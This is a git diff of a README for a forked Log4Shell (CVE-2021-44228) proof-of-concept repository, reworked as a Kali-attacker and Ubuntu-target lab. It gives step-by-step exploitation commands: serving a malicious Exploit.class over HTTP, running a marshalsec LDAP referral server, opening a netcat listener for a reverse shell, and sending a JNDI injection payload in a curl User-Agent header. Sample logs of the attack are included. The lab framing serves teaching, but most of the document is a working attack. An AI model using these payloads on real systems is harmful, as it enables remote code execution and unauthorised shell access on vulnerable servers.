@@ -1,25 +1,29 @@
 # Log4Shell POC (CVE-2021-44228)
 
+This is a fork from [marcourbano's](https://github.com/marcourbano/CVE-2021-44228/) repo but with a clearer explanation on setting it up. It is also setup to allow a reverse shell from the labs target server.
+
 The scope of this repository is to provide all the components needed to exploit CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/),   
 and to show how to exploit it.
 
 The ingredients needed to exploit this vulnerability are the following:
+Kali Linux with 
 1. An **LDAP Server** that will redirect the vulnerable application to the exploit.
-2. A **Vulnerable application** (Spring Boot web application vulnerable to CVE-2021-44228) using a vulnerable version of Log4J.
-3. The Java **Exploit.class** (and the corresponding
-Exploit.java file) that will be loaded by the Vulnerable application.
-4. An **http server** from which the Vulnerable application will download the malicious Exploit.class
+2. The Java **Exploit.class** (and the corresponding Exploit.java file) that will be loaded by the Vulnerable application.
+3. An **http server** from which the Vulnerable application will download the malicious Exploit.class
+
+Ubuntu Server with:
+1. A Vulnerable Java Application (found in the log4j-lab folder)
 
 Credits:
 - The **LDAP Server** has been pulled out from [mbechler](https://github.com/mbechler/marshalsec) Marshalsec repository.
-- The **Vulnerable application** is the one provided by [christophetd](https://github.com/christophetd/log4shell-vulnerable-app).
 
 Prerequisites:
-- Maven
 - Java
-- Docker
 - Python
+- Kali Linux
+- Ubuntu Server
 
+# Kali Linux
 ## Running `LDAP Server` and `HTTP Server`
 ### `HTTP Server`
 **1**. Move to `exploit` folder and spin up the http server by means of Python.
@@ -27,6 +31,7 @@ Prerequisites:
 python3 -m http.server PORT
 ```
 ### `LDAP Server`
+In a seperate Terminal Tab/Window:
 **1.** Move to `ldap_server` folder and build the `pom.xml`
 
 
@@ -39,34 +44,57 @@ mvn clean package -DskipTests
 ```
 java -cp ldap_server-1.0-all.jar marshalsec.jndi.LDAPRefServer "http://http_server_ip:http_server_port/#Exploit"
 ```
-
+### Listen for callback
+In a seperate Terminal Tab/Window:
+**1.** Use the Listen back command on port 4444 to wait for a reverse shell
+```
+nc -lvnp 4444
+```
 *Note: this command runs the malicious ldap server by enforcing it to answer with the **Exploit.class** URI to every ldap query.*
 
 
 
 
+# Ubuntu Server
 ## Running the `Vulnerable application`
 
-Run the docker vulnerable application docker container
+Boot up a fresh Ubuntu Server VM and run the below commands to get started with installing dependencies
 
 ```
-docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+sudo apt update && sudo apt upgrade -y
+```
+```
+sudo apt install openjdk-11-jdk -y
+```
+Once the server is setup, clone the git repo to the Ubuntu server and cd into the log4j-lab folder.
+```
+cd TargetServer/log4j-lab
+```
+You will need to download the log4j dependanies for the vulnerable java application to run
+```
+mkdir log4j && cd log4j
+
+wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar
+wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar
 ```
 
-*Note: by default we're executing the vulnerable application on port 8080, feel free to change it.*
+To run the Application just run 
+```
+./run_vulnerable_app.sh
+```
 
 ## Exploitation
 Once the `vulnerable_application`, the `ldap_server` and the `http_server`
  are running, send a malicious http request to the vulnerable server.
-
+In a seperate Terminal Tab run the below,
 ```
-curl VULNERABLE_APPLICATION_IP:8080 -H 'X-Api-Version: ${jndi:ldap://ldap_server_ip:1389/a}'
+curl -H 'User-Agent: ${jndi:ldap://LDAP_SERVER_IP:LDAP_PORT/exploit}' http://TARGETSERVERIP:8080/
 ```
 
 The `vulnerable_application` will log the payload and will perform an ldap query
 
 ```
-2021-12-24 18:48:14.644  INFO 1 --- [nio-8080-exec-1] HelloWorld: Received a request for API version ${jndi:ldap://10.0.2.15:1389/a}
+2025-01-12 18:48:14  [HTTP-DISPATCHER] INFO VulnerableApp - User-Agent: ${jndi:ldap://10.0.2.15:1389/exploit}
 ```
 
 The `ldap_server` will answer with the Exploit.class URI
@@ -83,7 +111,7 @@ Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ...
 172.17.0.2 - - [24/Dec/2021 19:48:14] "GET /Exploit.class HTTP/1.1" 200 -
 ```
 
-Finally, we can check that the exploit created a new file on the victim filesystem. In this example we need to check the docker container filesystem.
+Finally, In the Terminal window you had the netcat listening, you should now have reverse shell access
 
 ![](./POC.png)
 
@@ -94,4 +122,5 @@ https://github.com/mbechler/marshalsec
  https://github.com/christophetd/log4shell-vulnerable-app
 
 ## Contributors
-[@CrashOverflow](https://github.com/marcourbano)
+[@AdamJN](https://github.com/AdamJNew)
+[@CrashOverflow](https://github.com/marcourbano) - Forked from his repo
